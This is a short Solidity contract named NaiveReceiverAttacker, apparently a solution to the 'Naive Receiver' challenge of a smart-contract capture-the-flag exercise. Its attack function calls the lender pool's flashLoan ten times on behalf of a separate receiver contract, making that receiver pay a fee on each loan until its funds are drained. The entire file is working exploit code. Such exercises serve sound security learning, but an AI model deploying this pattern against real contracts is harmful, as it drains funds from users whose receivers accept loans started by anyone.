pragma solidity ^0.8.0;
import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    address payable private pool;
    address private receiver;

    constructor(address payable _pool, address _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() public {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool b = NaiveReceiverLenderPool(pool);
            b.flashLoan(receiver, 10);
        }
    }
}
